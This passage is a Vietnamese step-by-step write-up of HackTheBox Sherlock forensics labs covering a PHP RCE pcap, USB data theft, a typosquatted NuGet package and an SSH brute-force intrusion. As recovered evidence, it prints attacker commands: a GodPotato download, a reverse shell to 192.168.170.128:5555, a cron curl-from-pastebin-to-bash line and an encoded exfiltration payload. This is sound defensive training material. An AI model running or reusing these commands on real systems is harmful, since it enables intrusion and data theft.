Ta thấy có dấu hiệu chèn mã PHP là `<?php system('whoami');?>`
- Tìm trên Google:

![image](https://hackmd.io/_uploads/rytMKO0rWe.png)

**$\rightarrow$ Đáp án cần điền là `CVE-2024-4577`**

#### 5. What is the name and version of the vulnerable product exploited to get RCE?
> *** *.*.**
> 
Output câu trên có:
```
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25
X-Powered-By: PHP/8.1.25
```
**$\rightarrow$ Đáp án cần điền là `PHP 8.1.25`**

#### 6. What is the username of the victim account?
> ******

Output câu trên có: `desktop-htvplb2\cristo`

**$\rightarrow$ Đáp án cần điền là `cristo`**

#### 7. At what timestamp did the attacker execute the command to gain their initial foothold on the victim system?
> YYYY-MM-DD hh:mm:ss
- Sau khi dò bằng `whoami`, attacker sẽ chạy command để chiếm quyền. Ta thử lọc `frame contains "powershell"` thì thấy gói tin thứ tư khả nghi:

![image](https://hackmd.io/_uploads/BkeqRuRrbx.png)
- Kiểm tra TCP Stream:

![image](https://hackmd.io/_uploads/B1i3Ru0Hbl.png)
Gemini thử đoạn mã trên có ý nghĩa gì:

![image](https://hackmd.io/_uploads/Sy4OyFCHbg.png)
- Click vào packet `POST` và xem ở phần detail, tại `Arrival Time`:

![image](https://hackmd.io/_uploads/rJPACdCrbg.png)

**$\rightarrow$ Đáp án cần điền là `2025-01-22 09:47:32`**

#### 8. What is the MITRE ATT&CK technique ID used by the attacker to gain an initial foothold?
> T****
- Ta vào link [MITRE ATT&CK](https://attack.mitre.org/) và tìm đến `Initial access`:

![image](https://hackmd.io/_uploads/S1trsfkIbg.png)
> **MITRE ATT&CK** (Adversarial Tactics, Techniques & Common Knowledge):
> - Khung kiến thức toàn diện mô tả hành vi của kẻ tấn công mạng, bao gồm các chiến thuật (tactics) và kỹ thuật (techniques) cụ thể mà hacker sử dụng trong các cuộc tấn công thực tế.
> - Sức mạnh thực sự của MITRE ATT&CK nằm ở việc nó không chỉ mô tả các kỹ thuật tấn công, mà còn cung cấp bối cảnh thực tế. Mỗi kỹ thuật đều kèm theo:
>    - Mô tả chi tiết về cách thức hoạt động.
>    - Các ví dụ trong thế giới thực (các nhóm APT đã sử dụng).
>    - Phần mềm độc hại liên quan
>    - Phương pháp phát hiện khả thi.
>    - Biện pháp giảm thiểu.
- Vì bối cảnh challenge là lỗ hổng bị khai thác công khai trên network nên ta thử vào `Exploit Public-Facing Application` có ID là `T1190` và thành công.

![image](https://hackmd.io/_uploads/HkSd6MyUbx.png)

**$\rightarrow$ Đáp án cần điền là `T1190`**

#### 9. What is the name of the malicious executable the attacker downloaded and executed in memory to facilitate privilege escalation on the endpoint?
> *********-****.***
- Dùng `Ctrl` + `F` lọc string `.exe` theo từng mục list, details, bytes:

![image](https://hackmd.io/_uploads/HyuoLm1UZx.png)
Kiểm tra packet trên thì không thấy gì, nhưng `nc64.exe` nếu tìm trên Google thì ta vẫn biết đây là malicious app, tuy nhiên không phải đáp án cần tìm:

![image](https://hackmd.io/_uploads/rkKlP7y8Wx.png)
- Tiếp tục lọc sang byte thì thấy được một packet:

![image](https://hackmd.io/_uploads/BJIlUmkLZe.png)
- Kiểm tra TCP Stream thì có dòng:
```
iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile TimeProvider.exe
```
**$\rightarrow$ Đáp án cần điền là `GodPotato-NET4.exe`**

#### 10. What is the command line used by the attacker while performing privilege escalation?
> ./************.***-*** "****.*** ***.***.***.*** ****_* ***"

Trong TCP Stream vừa rồi, ngay sau đó có command:

![image](https://hackmd.io/_uploads/ByVjPQkIZe.png)

**$\rightarrow$ Đáp án cần điền là `./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"`**

#### 11. The attacker failed to escalate privileges and was given an error. What is the error?
> ****** ****** ******* **********:*

Ở TCP Stream, có thể thấy output trả về:

![image](https://hackmd.io/_uploads/rkXx_mJUWl.png)

**$\rightarrow$ Đáp án cần điền là `Cannot create process Win32Error:2`**

### II. Unsupervised:
> - [Link bài lab](https://app.hackthebox.com/sherlocks/Unsupervised?tab=play_sherlock)
> - Đề cho `Image.ad1` và `Important Files and Folders.txt`. Nội dung `Important Files and Folders.txt`:
> 
> ![image](https://hackmd.io/_uploads/Sk-BAAp8-l.png)

#### 1. Find out the time zone of victim PC. (UTC+xx:xx)
- Mở FTK Imager và export hive `SYSTEM` rồi dùng Registry Explorer để phân tích hive này:

![image](https://hackmd.io/_uploads/r1aWbyRU-e.png)
![image](https://hackmd.io/_uploads/HyoE-kRIZg.png)
- Vào `ControlSet001\Control\TimeZoneInformation`:

![image](https://hackmd.io/_uploads/rJALf1CI-e.png)
- Trong Registry của Windows, giá trị `Bias` được tính bằng phút và theo công thức: $$UTC = LocalTime + Bias$$ Nghĩa là: $$LocalTime = UTC - Bias = UTC - (-300') = UTC + 300'$$ Đổi từ phút sang giờ: $$300' = 5h$$

**$\rightarrow$ Đáp án: `UTC+05:00`**

#### 2. Employees should be trained not to leave their accounts unlocked. What is the username of the logged in user?
Trong FTK Imager, ở folder `Users`:

![image](https://hackmd.io/_uploads/HJZ8NJ0Ibg.png)

**$\rightarrow$ Đáp án: `MrManj`**

#### 3. How many USB storage devices were attached to this host in total?
Trong Registry Explorer, để kiểm tra dấu vết kết nối USB ta vào `SYSTEM\ControlSet001\Enum\USBTOR`:

![image](https://hackmd.io/_uploads/r1UfuyRUZl.png)
Có 7 giá trị nhưng 3 giá trị cuối có cảm giác đáng nghi hơn, nhập thử thì `3` là đáp án đúng.

**$\rightarrow$ Đáp án: `3`**

#### 4. What is the attach timestamp for the USB in UTC?
Từ output trên, chú ý rằng `Ven_TOSHIBA` có thời gian lần đầu kết nối và lần cuối kết nối đều giống nhau, nghĩa là USB này chỉ cắm vào máy một lần duy nhất:

![image](https://hackmd.io/_uploads/S1-tqJCL-x.png)

**$\rightarrow$ Đáp án: `2024-02-23 11:37:50`**

#### 5. What is the detach timestamp for the USB in UTC?
Từ câu trên.
**$\rightarrow$ Đáp án: `2024-02-23 11:39:12`**

#### 6. Which folder did he copy to the USB?
- Kiểm tra ShellBags (nằm ở `USRCLASS.DAT`).
> Nó lưu tên folder, thời gian truy cập. Nếu ta thấy tên một folder nhạy cảm xuất hiện trong ShellBags gắn liền với một Device GUID của USB, có thể khẳng định user đã duyệt qua thư mục đó trên USB.
- Trong FTK Imager, export `UsrClass.dat` ở `\Users\MrManj\AppData\Local\Microsoft\Windows\` rồi phân tích bằng tool [ShellBags Explorer](https://download.ericzimmermanstools.com/net9/ShellBagsExplorer.zip):

![image](https://hackmd.io/_uploads/rkHfreR8be.png)
![image](https://hackmd.io/_uploads/SJO2HeRU-g.png)
Ta thấy có thêm hai ổ đĩa mới là `E:\` và `F:\`.
- Kiểm tra cả hai ổ đĩa thì khả năng cao thư mục bị copy là `Documents`:

![image](https://hackmd.io/_uploads/ByTGDlCLWl.png)

**$\rightarrow$ Đáp án: `Documents`**

#### 7. There were subfolders in the folder that was copied. What is the name of the first subfolder? (Alphabetically)
Từ output trên.

**$\rightarrow$ Đáp án: `Business Proposals`**

#### 8. Eddie opens some files after copying them to the USB. What is the name of the file with the `.xlsx` extension Eddie opens?
- Ta kiểm tra `.lnk` file vì khi user mở file (từ Desktop, Downloads hay USB), Windows tự động tạo một file `.lnk` tương ứng. Trong FTK Imager vào `C:\Users\MrManj\AppData\Roaming\Microsoft\Windows\Recent\` rồi export toàn bộ thư mục:

![image](https://hackmd.io/_uploads/HJvUtxRLbl.png)
![image](https://hackmd.io/_uploads/ByCWseCUZe.png)
- Để phân tích `.lnk` ta dùng [LECmd](https://download.ericzimmermanstools.com/net9/LECmd.zip) bằng cách mở Command Prompt với quyền admin:
    - Đi tới folder chứa `LECmd.exe` rồi chạy command `.\LECmd.exe -d "<đường_dẫn_thư_mục_recent>" --csv "<đường_dẫn_thư_mục_kết_quả>`:

    ![image](https://hackmd.io/_uploads/H1n0ilCLWg.png)
    - Ở phần output có file `Business Leads.xlsx`:

    ![image](https://hackmd.io/_uploads/HJpvTxR8Wg.png)
    ![image](https://hackmd.io/_uploads/HykSTlAIZe.png)
  
    Check thời gian, ổ đĩa, ngày tháng, GUID thì đều trùng khớp với USB.

**$\rightarrow$ Đáp án: `Business Leads.xlsx`**

#### 9. Eddie opens some files after copying them to the USB. What is the name of the file with the .docx extension Eddie opens?
Tương tự, ta có `Proposal Brnrdr ltd.docx`:

![image](https://hackmd.io/_uploads/SkIsAlAIZl.png)
![image](https://hackmd.io/_uploads/r1620eC8Zl.png)
Check thời gian, ổ đĩa, ngày tháng, GUID thì đều trùng khớp với USB.

**$\rightarrow$ Đáp án: `Proposal Brnrdr ltd.docx`**

#### 10. What was the volume name of the USB?
Từ output câu 8 và 9:

![image](https://hackmd.io/_uploads/Hy4hkbRUbx.png)

**$\rightarrow$ Đáp án: `RVT-9J`**

#### 11. What was the drive letter of the USB?
Từ output câu 6 và 7.

**$\rightarrow$ Đáp án: `E`**

#### 12. I hope we can find some more evidence to tie this all together. What is Eddie's last name?
- Thumbnails là bản xem trước của hình ảnh và được tạo khi user mở folder chứa hình ảnh hoặc tài liệu.
- `Thumbcache` là database trong hệ điều hành Windows lưu trữ các ảnh thu nhỏ đó để nâng cao trải nghiệm người dùng bằng cách tăng tốc quá trình.
- Trong `\Users\MrManj\AppData\Local\Microsoft\Windows\Explorer\` có file `.db` là các ảnh thu nhỏ. Ta export folder này:

![image](https://hackmd.io/_uploads/H1im7H08Zg.png)
![image](https://hackmd.io/_uploads/BJbX4SA8be.png)
- Đẩy toàn bộ file `.db` lên [Thumbcache Viewer](https://thumbcacheviewer.github.io/) và phân tích. Lướt xuống gần cuối thì có các file `.png` và `.jpg`, xem các ảnh đó thì:

![image](https://hackmd.io/_uploads/SJP0LHRUbg.png)

**$\rightarrow$ Đáp án: `Homer`**

#### 13. There was an unbranded USB in the USB list, can you identify it's manufacturer’s name?
- Ở output câu 3, trong ba USB thì chỉ có cái cuối là không có nhãn hiệu:

![image](https://hackmd.io/_uploads/BJxtWZCLZl.png)
- Nhưng ta có Serial Number:

![image](https://hackmd.io/_uploads/HyiGMWRLbx.png)
- Check trong `SYSTEM\ControlSet001\Enum\USB` tìm USB có số Serial tương ứng:

![image](https://hackmd.io/_uploads/rJjx7bRIWg.png)
- Trong Registry, USB được định danh bằng chuỗi Key Name có định dạng `VID_XXXX&PID_YYYY`:
    - **VID (Vendor ID):** Mã định danh nhà sản xuất.
    - **PID (Product ID):** Mã định danh dòng sản phẩm.
- Thử tra Google thì có trang https://the-sz.com/products/usbid/ để xác định nguồn gốc USB:

![image](https://hackmd.io/_uploads/BJcKIZ08bg.png)
![image](https://hackmd.io/_uploads/rJn7L-A8Zg.png)

**$\rightarrow$ Đáp án: `Shenzhen SanDiYiXin Electronic Co.,LTD`**

### III. Nuts:
> - [Link bài lab](https://app.hackthebox.com/sherlocks/Nuts)
> - Đề cho một folder chứa ổ `C:/`.
> - Đề bài:
> 
> ![image](https://hackmd.io/_uploads/ByE5nogDZg.png)

#### 1. What action did Alex take to integrate the purported time-saving package into the deployment process? (provide the full command)
- Windows PowerShell 5.1 và PowerShell Core lưu 4096 commands cuối cùng trong một plaintext file của mỗi user's profile ở `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`. Trong quá trình đi tới địa chỉ này, ở folder `Roaming/` thì xuất hiện folder `NuGet/`:

![image](https://hackmd.io/_uploads/HJQb6BxDZg.png)
![image](https://hackmd.io/_uploads/rkrEargvbg.png)
- Trong `ConsoleHost_history.txt`:

![image](https://hackmd.io/_uploads/H1xKprgvWx.png)
**$\rightarrow$ Đáp án: `nuget install PublishIgnor -Version 1.0.11-beta`**

#### 2. Identify the URL from which the package was downloaded.
- Quay lại và đi vào folder `NuGet/` thì có file `NuGet.config`. `.config` là file lưu trữ danh sách nguồn. Mở nó bằng Notepad:

![image](https://hackmd.io/_uploads/SywhCSevZx.png)
Nhưng đáp án sai .-.
- Chrome lưu trữ dữ liệu (mật khẩu đã lưu, cookies và nhiều thông tin hữu ích khác) ở `C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default`. Đi vào thì có file `History`, kiểm tra nó bằng Notepad thì có đoạn:

![image](https://hackmd.io/_uploads/ryjLxLgP-e.png)
- Thử với đáp án `http://nuget.org/packages/PublishIgnor/` thì không đúng, ta thêm `s` vào giao thức `http` cũng sai:

![image](https://hackmd.io/_uploads/rk8sxUgvWg.png)
- Thử search URL đó trên thanh tìm kiếm thì dẫn tới trang web và ta có được URL đầy đủ, đó cũng là đáp án đúng:

![image](https://hackmd.io/_uploads/B19gWUxPZg.png)

**$\rightarrow$ Đáp án: `https://www.nuget.org/packages/PublishIgnor/`**

#### 3. Who is the threat actor responsible for publishing the malicious package? (the name of the package publisher)
Trang web của NuGet có tên Owner:

![image](https://hackmd.io/_uploads/BJupZIlwbl.png)
**$\rightarrow$ Đáp án: `a1l4m`**

#### 4. When did the attacker initiate the download of the package? Provide the timestamp in UTC format (YYYY-MM-DD HH:MM).
- Phân tích Master File Table (MFT) có thể tìm ra thông tin về cách tạo file, sự điều chỉnh và thời gian xoá, giúp thành lập timeline và phục hồi các file đã xoá.
- Ta dùng tool [MFTECmd.exe](https://download.ericzimmermanstools.com/net9/MFTECmd.zip) để phân tích file này:
    - Chạy Command Prompt với quyền admin rồi đưa file sang dạng `.csv` để phân tích:

    ![image](https://hackmd.io/_uploads/SJkF48xvbe.png)
    - `Ctrl` + `F` để tìm keyword `nuget` thì nó ra `nuget.exe`, tuy nhiên đây là file thực thi mà ta cần tìm thời gian tải. Tiếp tục với từ khoá `PublishIgnor`:

    ![image](https://hackmd.io/_uploads/rymxvUlwWl.png)
    > Cột T là `Created0x10`

**$\rightarrow$ Đáp án: `2024-03-19 18:41`**

#### 5. Despite restrictions, the attacker successfully uploaded the malicious file to the official site by altering one key detail. What is the modified package ID of the malicious package?
Package ID là tên định danh duy nhất của gói, ở output câu 1, lệnh `install` sẽ có dạng `nuget install <Package_ID>`:

![image](https://hackmd.io/_uploads/rJqxuUlDbl.png)
**$\rightarrow$ Đáp án: `PublishIgnor`**

#### 6. Which deceptive technique did the attacker employ during the initial access phase to manipulate user perception? (technique name)
- Ở trang web chính thức của NuGet, packpage ID là `PublishIgnore`:

![image](https://hackmd.io/_uploads/B18VtLevbl.png)
Tuy nhiên tên giả mạo là `PublishIgnor`.
- Ngoài ra, ở output câu 2, có một đoạn "quảng cáo" nhưng gặp lỗi chính tả khá nhiều và trông có vẻ scam:

![image](https://hackmd.io/_uploads/ryjLxLgP-e.png)
- Search thì đây là kiểu tấn công chiếm quyền URL:

![image](https://hackmd.io/_uploads/rkRbo8lPWx.png)
**$\rightarrow$ Đáp án: `typosquatting`**

#### 7. Determine the full path of the file within the package containing the malicious code.
- Trong folder `Administrators/` có `.nuget`. Thử đi vào dần dần `\C\Users\Administrator\.nuget\packages\publishignor\1.0.11-beta`:

![image](https://hackmd.io/_uploads/BJEPhUgwbx.png)
Trong `tools`:

![image](https://hackmd.io/_uploads/rymjhUxvZl.png)
- Mở `init.ps1` bằng Notepad:

![image](https://hackmd.io/_uploads/HkZzRUePWe.png)
Đây là tập lệnh độc hại nhằm vô hiệu hóa bảo mật và tải về phần mềm thực thi từ server của attacker (Cre: Gemini).

![image](https://hackmd.io/_uploads/BJah1PlwZg.png)
![image](https://hackmd.io/_uploads/Hk10kPxvWe.png)
![image](https://hackmd.io/_uploads/B1-VlPxDZx.png)
![image](https://hackmd.io/_uploads/HyWalvlv-l.png)

**$\rightarrow$ Đáp án: `C:\Users\Administrator\.nuget\packages\publishignor\1.0.11-beta\tools\init.ps1`**

#### 8. When tampering with the system's security settings, what command did the attacker employ?
Từ ouput câu trên, theo giải thích của Gemini:

![image](https://hackmd.io/_uploads/SymVkDlP-l.png)
**$\rightarrow$ Đáp án: `Set-MpPreference -DisableRealtimeMonitoring $true`**

#### 9. Following the security settings alteration, the attacker downloaded a malicious file to ensure continued access to the system. Provide the SHA1 hash of this file.
Từ output câu 7, ta đã có được path của file thực thi độc hại của attacker, vào Command Prompt để lấy SHA1 của file này.

**$\rightarrow$ Đáp án: `57b7acf278968eaa53920603c62afd8b305f98bb`**

#### 10. Dentify the framework utilised by the malicious file for command and control communication.
- Command and Control (C2) Framework là bộ công cụ mà attacker dùng để quản lý các máy tính đã bị chiếm quyền điều khiển, gồm hai phần:
    - Server: Của attacker dùng để ra lệnh.
    - Agent (Beacon): Mã độc cài trên máy nạn nhân để nhận lệnh và gửi dữ liệu về.
- Kiểm tra mã hash trên VirusTotal thì:

![image](https://hackmd.io/_uploads/ryfpmFgwWl.png)
Có thể là malware chết rồi, tham khảo khắp nơi thì đáp án của câu này là `silver`.

> Check log của Windows Defender (chi tiết cách check ở câu 12), tìm keyword `uninstall.exe` thì được:
> 
> ![image](https://hackmd.io/_uploads/rJPOoogD-x.png)

**$\rightarrow$ Đáp án: `silver`**

#### 11. At what precise moment was the malicious file executed?
- Để tìm thời điểm file thực thi, ta phân tích prefetch file vì nó được tạo khi một app khởi chạy lần đầu. Vị trí: `C:\Windows\Prefetch\`:

![image](https://hackmd.io/_uploads/ByWbpFevbg.png)
- Dùng tool [PECmd](https://download.ericzimmermanstools.com/net9/PECmd.zip) để phân tích:

![image](https://hackmd.io/_uploads/r1FpTKgDZe.png)
![image](https://hackmd.io/_uploads/Hy8UCtgwbl.png)
Dựa vào hai output trên thì có thể thấy rằng thời gian thực thi của file này là `2024-03-19 19:23:36`.

**$\rightarrow$ Đáp án: `2024-03-19 19:23:36`**

#### 12. The attacker made a mistake and didn’t stop all the features of the security measures on the machine. When was the malicious file detected? Provide the timestamp in UTC.
- Vì không tắt features bảo mật nên file đã bị Windows Defender phát hiện, ta kiểm tra log của nó ở `"C:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx"` bằng tool [EvtxECmd](https://download.ericzimmermanstools.com/net9/EvtxECmd.zip):

![image](https://hackmd.io/_uploads/Hy1Qxclw-e.png)
![image](https://hackmd.io/_uploads/HyJVe9lDZl.png)
- Mở file `.csv` và lọc Event ID `1116` - Phát hiện mã độc hoặc `1117` - Thực hiện ngăn chặn:

![image](https://hackmd.io/_uploads/SJ40lcev-g.png)
- File bị phát hiện lúc `3/19/2024 7:33:32 PM`:

![image](https://hackmd.io/_uploads/BJLs-5lDbx.png)

**$\rightarrow$ Đáp án: `2024-03-19 19:33:32`**

#### 13. After establishing a connection with the C2 server, what was the first action taken by the attacker to enumerate the environment? Provide the name of the process.
- Trong `C:\Windows\Prefetch\` ta tìm thấy ![image](https://hackmd.io/_uploads/rkYFEclDZg). Thử nhập đáp án thì đây là đáp án đúng.
> `whoami` để kiểm tra quyền hạn hiện tại.
- Để chắc chắn hơn, kiểm tra theo thời gian tạo bằng tool [Timeline Explorer](https://download.ericzimmermanstools.com/net9/TimelineExplorer.zip):

![image](https://hackmd.io/_uploads/ryXZeilw-l.png)

**$\rightarrow$ Đáp án: `whoami.exe`**

#### 14. To ensure continued access to the compromised machine, the attacker created a scheduled task. What is the name of the created task?
- Thử kiểm tra log của `"C:\Windows\System32\winevt\logs\Microsoft-Windows-TaskScheduler%4Maintenance.evtx"` trực tiếp bằng Event Viewer thì không có gì đặc biệt
- Vào `C:\Users\Ha Nguyen\Desktop\Nuts\C\Windows\System32\Tasks`:

![image](https://hackmd.io/_uploads/HkxkYqxP-x.png)
Trông `MicrosoftSystemDailyUpdates` rất khả nghi, check thử thì đây là đáp án đúng.

**$\rightarrow$ Đáp án: `MicrosoftSystemDailyUpdates`**

#### 15. When was the scheduled task created? Provide the timestamp in UTC.
Mở thử file trên bằng Notepad:

![image](https://hackmd.io/_uploads/HJwRY5eDbe.png)

**$\rightarrow$ Đáp án: `2024-03-19 19:24:05`**

#### 16. Upon concluding the intrusion, the attacker left behind a specific file on the compromised host. What is the name of this file?
- Ta lọc file `.csv` của MFT ban đầu theo mốc thời gian tạo bằng tool Timeline Explorer. Lọc những file `.exe` được tạo sau `2024-03-19 19:24:05`:

![image](https://hackmd.io/_uploads/rkxLDeixDbl.png)
![image](https://hackmd.io/_uploads/r1ajlilD-x.png)
![image](https://hackmd.io/_uploads/rybAlogwbl.png)
![image](https://hackmd.io/_uploads/BktkbslvWg.png)
![image](https://hackmd.io/_uploads/BkEMZslP-g.png)
![image](https://hackmd.io/_uploads/BkgE-sgD-e.png)
![image](https://hackmd.io/_uploads/ByFPWolvbg.png)
Chắc đám này không phải đâu :DD
- Lọc tiếp thì tìm thấy:

![image](https://hackmd.io/_uploads/ryWmzilv-x.png)
> Nhưng có một sự ảo ma là đây lại là đáp án của câu 17 (mình gõ nhầm ô đáp án thì nó bảo đúng, nhìn kĩ lại thì không phải câu 16).
- Tìm lòi con mắt không ra nên tham khảo write up mạng:

![image](https://hackmd.io/_uploads/rkXszoxPWg.png)
> Mình đã thử check lại theo mốc thời gian của đáp án trên trong bài mình như nó không ra:
> 
> ![image](https://hackmd.io/_uploads/HJezXoePbl.png)

**$\rightarrow$ Đáp án: `file.exe`**

#### 17. As an anti-forensics measure. The threat actor changed the file name after executing it. What is the new file name?
**$\rightarrow$ Đáp án: `Updater.exe`**

#### 18. Identify the malware family associated with the file mentioned in the previous question (17).
- Ta cũng đã có địa chỉ của `Updater.exe`:

![image](https://hackmd.io/_uploads/ByWmNogPWg.png)
- Trích mã hash và search trên Virus Total:

![image](https://hackmd.io/_uploads/H1oK4sgvZg.png)
**$\rightarrow$ Đáp án: `Impala`**

#### 19. When was the file dropped onto the system? Provide the timestamp in UTC.
Từ output câu 17:

![image](https://hackmd.io/_uploads/ryeWPjxPWx.png)

**$\rightarrow$ Đáp án: `2024-03-19 19:30:04`**

### IV. LuckyShot:
- [Link bài lab](https://app.hackthebox.com/sherlocks/LuckyShot?tab=play_sherlock)
- Kịch bản: *"The IT Manager of Techniqua-Solutions Corp. is responsible for managing the company’s infrastructure. As part of his daily work, he frequently accesses company servers and workstations. One morning, the IT Manager discovered that several critical company files were missing, while others had been modified or replaced with unfamiliar ones. Concerned about a potential breach, he reported the issue to the security team. As an incident response analyst, your task is to investigate the case. You have been provided with a forensic image of the IT Manager’s machine."*
- Đề cho file `LuckShot.zip` chứa:
![image](https://hackmd.io/_uploads/SyhTnKI9bl.png)

#### 1. What method did the attacker use to gain access to the system?
Kiểm tra `\LuckyShot\[root]\var\log\auth.log`, lướt từ dưới lên trên thấy có rất nhiều đoạn như:
![image](https://hackmd.io/_uploads/BJaVkcIq-l.png)
**$\rightarrow$ Đáp án: `Brute Force`**

#### 2. At what time did the attacker successfully log in for the first time?
Từ file trên, ta thấy:
![image](https://hackmd.io/_uploads/ByYoHCvcZe.png)
**$\rightarrow$ Đáp án: `2025-02-10 19:39:03`**

#### 3. Which user account was compromised by the attacker
Cũng từ ouput câu trên, ta tìm được đáp án là `administrator`.

**$\rightarrow$ Đáp án: `administrator`**

#### 4. What command was executed by the attacker to check user privileges?
Kiểm tra `\[root]\home\administrator\.bash_history`, ta thấy:
![image](https://hackmd.io/_uploads/SJ41F5Uq-x.png)
**$\rightarrow$ Đáp án: `groups administrator`**

#### 5. What was the first tool the attacker downloaded to extract stored credentials from the system
Từ output câu trên, tiếp tục kiểm tra:
![image](https://hackmd.io/_uploads/rJ6OF585be.png)
**$\rightarrow$ Đáp án: `LaZagne`**

#### 6. The attacker located sensitive files on the compromised system and transferred them to a remote machine. Which command-line tool was used for this exfiltration?
Từ output câu trên:
![image](https://hackmd.io/_uploads/SkB-59U9-g.png)
**$\rightarrow$ Đáp án: `scp`**
> - SCP (secure copy – bản sao an toàn) là một tiện ích dòng lệnh cho phép user sao chép files và thư mục trên Linux hệ thống cục bộ đến một hệ thống từ xa và ngược lại, hoặc giữa hai hệ thống từ xa từ hệ thống cục bộ.
> - Khi dùng SCP để chuyển dữ liệu thì cả thông tin và mật khẩu tệp đều được mã hoá để bảo vệ quyền riêng tư của owner.

#### 7. What IP did the attacker exfiltrate the files to?
Từ output câu trên:
![image](https://hackmd.io/_uploads/SkB-59U9-g.png)
**$\rightarrow$ Đáp án: `192.168.161.198`**

#### 8. The attacker continued their exploitation and executed a malicious script on the victim machine. What is the name of the script?
Từ output câu trên:
![image](https://hackmd.io/_uploads/rkKn35Lcbx.png)
**$\rightarrow$ Đáp án: `sys_monitor.sh`**

#### 9. What is the SHA1 hash of the malware?
Vào `LuckyShot\hash_executables\hash_executables.sha1`:
![image](https://hackmd.io/_uploads/H1PuTcI9Zx.png)
**$\rightarrow$ Đáp án: `3ae5dea716a4f7bfb18046bfba0553ea01021c75`**

#### 10. The malware installed a component that pretends to be part of system network management but is actually running with root privileges. What is the name of the component?
-  `auth.log`:
![image](https://hackmd.io/_uploads/B1mglj8cWe.png)
- Trong `/[root]/etc/systemd/system/systemd-networkm.service`:
![image](https://hackmd.io/_uploads/BkLQQo8cbe.png)

**$\rightarrow$ Đáp án: `systemd-networkm.service`**

#### 11. The attacker modified several startup configuration files, each spawning a network listener on a different port at login. What is the name of the file that starts the listener on the lowest port number?
Trong thư mục `/[root]/root`, thử xem nội dung của từng file:
![image](https://hackmd.io/_uploads/SybvY0D5Wg.png)
- `.ssh` có bằng chứng cho thấy attacker đang thiết lập cơ chế Persistence để có thể quay lại hệ thống bất cứ lúc nào mà không cần mật khẩu:
![image](https://hackmd.io/_uploads/By1BsCP9bx.png)
    - Nếu chèn đoạn mã vào `/.ssh/authorized_keys` vào máy victim, attacker có thể remote vào từ xa thông qua SSH bằng Private Key tương ứng mà không cần biết mật khẩu.
    - Ở đây, `ssh-rsa` là loại thuật toán, theo sau là chuỗi mã hoá base64 nội dung khoá và tên máy của attacker là `kali@kali`.
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCnoiT13BNG/mRCoizCTYQncnZkhm62c0WivVvTZ32FxGh+J8HzLcYnI3/FLPt2FfAkjXV1+LU+gLHtFossAIo4BfuZj7c1xwxbuEbGjD5sEYI9ayiIGV+NUM99zweVI2fVt18s0y99EHS1h94aqMT3J/J7hjbMhAuQC8ij295WReT3XvXkZ0U6YI/qFPoO7VnE4OPjq8Cgmfr7PXdpsLBs5FZ5qX6T9nWuU3yDSZWMLGyYMo0VlT1oY7fcUJyMRCjG9YHxFlGhX+136qLD+PlDWMaBJqVHfiTNyP8V4Yz9gitJ45veO6dPTa9sUHUe2LeNAVFmEgAvfaLyMZPBl6CEXzvtZbYH4Yld1U86tascPTXtLDdLipe2ElMisuld58gqWQYctkyuPTvkJwlZvxfVcFN0bA3uapEi2S3toQdoLJZO06UZxOJBBI2pjFIBJkJdiIpOzsvNPTs46hsmaIN97RHAWgm8fTd1yjXOiqoZlAo9Jujvh6KAuHiHANAuztSvC5IrgVWM5wiZBQRAVfrZanojjZr8ig22GEKupEuwCgNHc4V+VLj6ki0u5E6xeBEyhH9qZO3erK9xvqR5VMGqUnfa6qo9/ORaILj4CpX08/5He9JbgOIPpOOFEVm6e/AudL8PcPsE+oJwlXZFoyWoRyAd7CJBkbEaGHTjQ643Lw== kali@kali
```
- Trong `.bashrc`:
![image](https://hackmd.io/_uploads/HJuoiAD5-l.png)
- Trong `.profile`:
![image](https://hackmd.io/_uploads/ryTCiADq-x.png)

**$\rightarrow$ Đáp án: `systemd-networkm.service`**

#### 12. What is the username and hostname associated with the attacker?
Từ output câu trên:
![image](https://hackmd.io/_uploads/Hk2S20wc-g.png)
**$\rightarrow$ Đáp án: `kali@kali`**

#### 13. The attacker created a user for persistence, what is the name of the created user?
Lần mò trong `auth.log`:
![image](https://hackmd.io/_uploads/rJC_G1u5bx.png)
**$\rightarrow$ Đáp án: `Regev`**

#### 14. At what exact timestamp was the new user created on the system?
Cũng từ output câu trên:
![image](https://hackmd.io/_uploads/rJC_G1u5bx.png)
**$\rightarrow$ Đáp án: `2025-02-10 20:11:21`**

#### 15. The malware set up an automated process to fetch and execute a remote payload from a legitimate web service. What is the full command responsible for retrieving this payload?
- `/etc/cron.d` là một thư mục hệ thống chứa các files cấu hình cho các tác vụ lập lịch định kỳ. Bất kỳ file nào được đặt vào đây với đúng định dạng sẽ được dịch vụ `crond` tự động quét và thực thi mà không cần khởi động lại máy.
- Trong `/etc/cron.d/syscheck`:
```
/1 * * * root command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash
```

**$\rightarrow$ Đáp án: `command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash`**

#### 16. The payload was used to extract more sensitive files. What was the command ran to extract the more sensitive file
- Từ command trên, ta thấy sau khi tải nội dung thô từ web thì đảo ngược toàn bộ chuỗi rồi giải mã nó từ base64 và chạy.
- Vào link trên, ta được:
```
=AHaw5CbhVGdz9CO5EjLxYTMugjNx4iM5EzLvoDc0RHag0CQgQWLgQ1UPBFIY1CIsJXdjBCfgQ2dzNXYw9yY0V2LgQjNlNXYipQDwhGcuwWYlR3cvgTOx4SM2EjL4YTMuITOx8yL6AHd0hGItAEIk1CIUN1TQBCWtACbyV3YgwHI39GZhh2cvMGdl9CI0YTZzFmY
```
- Chạy đoạn `.py` sau:
``` py
import base64

payload = "=AHaw5CbhVGdz9CO5EjLxYTMugjNx4iM5EzLvoDc0RHag0CQgQWLgQ1UPBFIY1CIsJXdjBCfgQ2dzNXYw9yY0V2LgQjNlNXYipQDwhGcuwWYlR3cvgTOx4SM2EjL4YTMuITOx8yL6AHd0hGItAEIk1CIUN1TQBCWtACbyV3YgwHI39GZhh2cvMGdl9CI0YTZzFmY"
reverse_str = payload[::-1]
